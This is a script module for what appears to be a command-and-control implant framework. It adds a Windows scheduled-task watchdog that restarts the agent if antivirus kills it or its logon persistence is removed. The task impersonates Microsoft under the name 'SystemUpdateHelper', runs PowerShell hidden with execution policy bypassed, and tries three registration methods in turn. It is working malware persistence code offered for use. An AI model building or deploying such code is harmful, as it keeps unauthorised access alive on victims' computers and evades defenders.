// extensions/task_watchdog.rhai
//
// Companion to persist_sf2: a WATCHDOG scheduled task that every N
// minutes checks whether the agent process is present and starts it if
// not. Two tasks end up covering the host:
//   persist_sf2 task  -> fires at logon, starts the agent
//   task_watchdog     -> fires every N min, restarts the agent if it
//                        died, was killed by AV, or the logon task
//                        was wiped
//
// WHY XML REGISTRATION IS THE PRIMARY PATH HERE (lesson learned on the
// target host itself): for this user context (standard user, UAC-
// filtered token) Register-ScheduledTask WITHOUT an explicit principal
// and schtasks.exe /create BOTH return "Access is denied". Only
// Register-ScheduledTask -Xml with an explicit <UserId> +
// <LogonType>InteractiveToken</LogonType> principal is accepted.
// The cmdlet and schtasks paths are kept as fallbacks for other hosts.
//
// The watchdog itself is a ~10 line PowerShell dropped next to the
// stable binary; the task action is powershell.exe -File watchdog.ps1.
// Deliberately benign: no binary drop, no AV tamper, no network - just
// a presence check + Start-Process. Nothing here is loud.
//
// "Present" means: a process NAMED <LABEL> is running. If your agent
// runs in-memory under another host process name, the watchdog will
// not see it and will start a second instance from the stable path.
//
// Constraint (same as the agent itself): an InteractiveToken principal
// only runs while this user is logged on. For a user-context agent
// that is not a restriction - no logon, no agent to watch anyway.
//
// Usage
//   extension load task_watchdog
//   extension load task_watchdog <label>
//   extension load task_watchdog <label> <interval_minutes> [binary.exe]
//
// Return JSON
//   { "result": "success"|"error", "version", "label", "task",
//     "interval_minutes", "task_principal", "watchdog_script",
//     "watchdog_log", "test_fire", "test_detail",
//     "existed_before", "cleanup_cmd" }

// ── Config ────────────────────────────────────────────────────────────
let LABEL = "SystemUpdateHelper";
if args.len() > 0 {
    let a = args[0];
    a.trim();
    if a.len() > 0 { LABEL = a; }
}

// Repetition interval in minutes (1..720, default 5).
let INTERVAL = 5;
if args.len() > 1 {
    let iv = args[1];
    iv.trim();
    try {
        let n = parse_int(iv);
        if n >= 1 && n <= 720 { INTERVAL = n; }
    } catch {
        print_log("[task_watchdog] ignoring unparsable interval '" + iv + "'");
    }
}

// Optional explicit binary path; default is the persist_sf2 stable
// location. The watchdog refuses to register if the binary is absent.
let CUSTOM_BINARY = "";
if args.len() > 2 {
    let cb = args[2];
    cb.trim();
    if cb.len() > 3 { CUSTOM_BINARY = cb; }
}

let WD_TASK = LABEL + "_wd";

// ── Platform guard (Windows-only by design) ───────────────────────────
let is_windows = internal_env("SystemRoot").contains("Windows");
if !is_windows {
    return "{\"result\":\"error\",\"version\":\"1.0\"," +
           "\"detail\":\"task_watchdog is Windows-only\"}";
}

print_log("[task_watchdog] label=" + LABEL + "  task=" + WD_TASK + "  interval=" + INTERVAL + "min");
print_log("[task_watchdog] build v1.0 2026-11-12 - XML-first registration (host quirk: cmdlets+schtasks denied)");

// JSON escaping: backslashes double, quotes become single, CR/LF flatten.
fn jesc(s) {
    let r = s;
    r.replace("\\", "\\\\");
    r.replace("\"", "'");
    r.replace("\r", " ");
    r.replace("\n", " ");
    r
}

// ── Resolve the watched binary ────────────────────────────────────────
let stable_dir  = internal_env("LOCALAPPDATA") + "\\Programs\\" + LABEL;
let stable_path = stable_dir + "\\" + LABEL + ".exe";
if CUSTOM_BINARY.len() > 3 { stable_path = CUSTOM_BINARY; }

let chk = exec_os_timeout(
    "if (Test-Path -LiteralPath '" + stable_path + "') { 'OK' }",
    8
);
if !chk.contains("OK") {
    return "{\"result\":\"error\",\"version\":\"1.0\"," +
           "\"detail\":\"watched binary not found at " + jesc(stable_path) + " - " +
           "run persist_sf2 first, or pass the binary path as arg 3\"}";
}

// ── Task Scheduler service pre-flight (same lesson as persist_sf2) ────
let svc_state = exec_os_timeout(
    "$s = Get-Service Schedule -ErrorAction SilentlyContinue; " +
    "if (-not $s) { 'MISSING' } elseif ($s.Status -eq 'Running') { 'RUNNING' } " +
    "else { try { Start-Service Schedule -ErrorAction Stop; 'STARTED' } " +
    "catch { 'STOPPED: ' + $_.Exception.Message } }",
    20
);
if !svc_state.contains("RUNNING") && !svc_state.contains("STARTED") {
    return "{\"result\":\"error\",\"version\":\"1.0\"," +
           "\"detail\":\"Task Scheduler service is not available ('" + jesc(svc_state) + "')\"}";
}

// ── Who are we (becomes the explicit XML principal) ───────────────────
let session_user = exec_os("whoami 2>$null");
session_user.trim();
if session_user.len() < 3 {
    return "{\"result\":\"error\",\"version\":\"1.0\"," +
           "\"detail\":\"could not determine session user (whoami empty)\"}";
}
let task_principal = session_user;

// ── Idempotency note (re-register with -Force either way, so interval
//    changes apply) ────────────────────────────────────────────────────
let existed = exec_os_timeout(
    "Get-ScheduledTask -TaskName '" + WD_TASK + "' -ErrorAction SilentlyContinue | " +
    "Select-Object -ExpandProperty TaskName",
    10
);
let existed_before = existed.contains(WD_TASK);

// ── Drop the watchdog script next to the binary ───────────────────────
let wd_ps1 = stable_dir + "\\watchdog.ps1";
let wd_log = stable_dir + "\\watchdog.log";
let ps1 =
    "$ErrorActionPreference = 'SilentlyContinue'\n" +
    "$name = '" + LABEL + "'\n" +
    "$exe  = '" + stable_path + "'\n" +
    "$log  = '" + wd_log + "'\n" +
    "$alive = @(Get-Process -Name $name)\n" +
    "if ($alive.Count -eq 0) {\n" +
    "    Start-Process -FilePath $exe -WindowStyle Hidden\n" +
    "    Add-Content -LiteralPath $log -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '  started  ' + $exe)\n" +
    "}\n";
internal_write(wd_ps1, ps1);
let wchk = exec_os_timeout(
    "if (Test-Path -LiteralPath '" + wd_ps1 + "') { 'OK' }",
    8
);
if !wchk.contains("OK") {
    return "{\"result\":\"error\",\"version\":\"1.0\"," +
           "\"detail\":\"could not write watchdog script to " + jesc(wd_ps1) + "\"}";
}

// ── Attempt A (PRIMARY on this host): explicit task XML ───────────────
// TimeTrigger with Repetition/Interval and NO Duration repeats
// indefinitely; a StartBoundary in the past makes the task run at
// registration time and at the first logon after boot.
let xml_path = internal_env("TEMP") + "\\" + WD_TASK + ".xml";
let xml =
    "<?xml version=\"1.0\"?>\n" +
    "<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\" version=\"1.2\">\n" +
    "  <RegistrationInfo>\n" +
    "    <Author>Microsoft Corporation</Author>\n" +
    "    <Description>System update helper orchestration service.</Description>\n" +
    "  </RegistrationInfo>\n" +
    "  <Triggers>\n" +
    "    <TimeTrigger>\n" +
    "      <Repetition><Interval>PT" + INTERVAL + "M</Interval></Repetition>\n" +
    "      <StartBoundary>2026-01-01T00:00:00</StartBoundary>\n" +
    "      <Enabled>true</Enabled>\n" +
    "    </TimeTrigger>\n" +
    "  </Triggers>\n" +
    "  <Principals>\n" +
    "    <Principal id=\"Author\">\n" +
    "      <UserId>" + task_principal + "</UserId>\n" +
    "      <LogonType>InteractiveToken</LogonType>\n" +
    "      <RunLevel>LeastPrivilege</RunLevel>\n" +
    "    </Principal>\n" +
    "  </Principals>\n" +
    "  <Settings>\n" +
    "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n" +
    "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n" +
    "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n" +
    "    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>\n" +
    "    <Hidden>false</Hidden>\n" +
    "  </Settings>\n" +
    "  <Actions>\n" +
    "    <Exec>\n" +
    "      <Command>powershell.exe</Command>\n" +
    "      <Arguments>-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + wd_ps1 + "\"</Arguments>\n" +
    "    </Exec>\n" +
    "  </Actions>\n" +
    "</Task>";
internal_write(xml_path, xml);
let xml_out = exec_os_timeout(
    "try { Register-ScheduledTask -TaskName '" + WD_TASK + "' " +
    "-Xml (Get-Content -LiteralPath '" + xml_path + "' -Raw) -Force -ErrorAction Stop | Out-Null; 'XML_OK' } " +
    "catch { 'XML_FAIL: ' + $_.Exception.Message }",
    25
);
let reg_ok = xml_out.contains("XML_OK");
let reg_out = xml_out;
exec_os_timeout(
    "Remove-Item -LiteralPath '" + xml_path + "' -Force -ErrorAction SilentlyContinue",
    5
);

// ── Attempt B (fallback for other hosts): cmdlets with EXPLICIT user ──
if !reg_ok {
    let rep_cmd =
        "$a = New-ScheduledTaskAction -Execute 'powershell.exe' " +
        "-Argument '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + wd_ps1 + "\"'; " +
        "$t = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) " +
        "-RepetitionInterval (New-TimeSpan -Minutes " + INTERVAL + ") -RepetitionDuration ([TimeSpan]::MaxValue); " +
        "try { Register-ScheduledTask -TaskName '" + WD_TASK + "' -Action $a -Trigger $t " +
        "-User '" + task_principal + "' -LogonType InteractiveToken -RunLevel Limited -Force -ErrorAction Stop | Out-Null; 'REG_OK' } " +
        "catch { 'REG_FAIL: ' + $_.Exception.Message }";
    reg_out = exec_os_timeout(rep_cmd, 30);
    reg_ok = reg_out.contains("REG_OK");
}

// ── Attempt C (last): schtasks.exe ────────────────────────────────────
let st_out = "";
if !reg_ok {
    st_out = exec_os_timeout(
        "schtasks /create /tn \"" + WD_TASK + "\" /tr \"\\\"powershell.exe\\\" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\"" + wd_ps1 + "\\\"\" /sc minute /mo " + INTERVAL + " /f",
        20
    );
    reg_ok = st_out.contains("SUCCESS");
}

// ── Read-back through BOTH interfaces (one retry) ─────────────────────
let vb = "";
let sb = "";
for i in 0..1 {
    vb = exec_os_timeout(
        "Get-ScheduledTask -TaskName '" + WD_TASK + "' -ErrorAction SilentlyContinue | " +
        "Select-Object -ExpandProperty TaskName",
        10
    );
    sb = exec_os_timeout("schtasks /query /tn \"" + WD_TASK + "\" 2>$null", 10);
    if vb.contains(WD_TASK) || sb.contains(WD_TASK) { break; }
    if i == 0 { exec_os_timeout("Start-Sleep -Seconds 3", 6); }
}
if !vb.contains(WD_TASK) && !sb.contains(WD_TASK) {
    return "{\"result\":\"error\",\"version\":\"1.0\"," +
           "\"detail\":\"watchdog registration failed - all three attempts ran but neither " +
           "Get-ScheduledTask nor schtasks can find '" + WD_TASK + "'; raw outputs below\"," +
           "\"service_state\":\"" + jesc(svc_state) + "\"," +
           "\"attempt_xml\":\"" + jesc(reg_out) + "\"," +
           "\"attempt_schtasks\":\"" + jesc(st_out) + "\"," +
           "\"watchdog_script\":\"" + jesc(wd_ps1) + "\"}";
}
print_log("[task_watchdog] watchdog task registered: " + WD_TASK + " (principal=" + task_principal + ")");

// ── Test-fire once: run the watchdog now and report what it saw ───────
// Expected outcome on a live session: the agent IS running, so the
// watchdog correctly does nothing. That still proves task -> powershell
// -> script -> process check end to end.
let tf = exec_os_timeout(
    "try { Start-ScheduledTask -TaskName '" + WD_TASK + "' -ErrorAction Stop; 'FIRED' } " +
    "catch { 'FIRE_FAIL: ' + $_.Exception.Message }",
    15
);
exec_os_timeout("Start-Sleep -Seconds 6", 10);
let running = exec_os_timeout(
    "if (Get-Process -Name '" + LABEL + "' -ErrorAction SilentlyContinue) { 'RUNNING' } else { 'NOT_RUNNING' }",
    10
);
let test_fire = "not_tested";
let test_detail = "";
if tf.contains("FIRED") {
    if running.contains("RUNNING") {
        test_fire = "watchdog_ran_agent_present";
        test_detail = "watchdog executed; a process named " + LABEL +
                      " is running, so no action was taken (expected while your session is up). " +
                      "Kill the agent manually and within " + INTERVAL +
                      " min the watchdog should restart it - check " + wd_log + " for a 'started' line.";
    } else {
        test_fire = "watchdog_started_agent";
        test_detail = "watchdog executed and no " + LABEL +
                      " process was present; it should have been started - verify the process now exists.";
    }
} else {
    test_fire = "test_fire_failed";
    test_detail = jesc(tf);
}

// ── Result ────────────────────────────────────────────────────────────
print_log("[task_watchdog] result=success  test_fire=" + test_fire);

return
    "{\"result\":\"success\"," +
    "\"version\":\"1.0\"," +
    "\"label\":\"" + LABEL + "\"," +
    "\"task\":\"" + WD_TASK + "\"," +
    "\"interval_minutes\":" + INTERVAL + "," +
    "\"task_principal\":\"" + jesc(task_principal) + "\"," +
    "\"existed_before\":" + existed_before + "," +
    "\"watchdog_script\":\"" + jesc(wd_ps1) + "\"," +
    "\"watchdog_log\":\"" + jesc(wd_log) + "\"," +
    "\"test_fire\":\"" + test_fire + "\"," +
    "\"test_detail\":\"" + jesc(test_detail) + "\"," +
    "\"cleanup_cmd\":\"shell Unregister-ScheduledTask -TaskName '" + WD_TASK + "' -Confirm:$false\"," +
    "\"cleanup_note\":\"watchdog.ps1 and watchdog.log in " + jesc(stable_dir) + " are left behind - remove them with the binary during cleanup\"}";
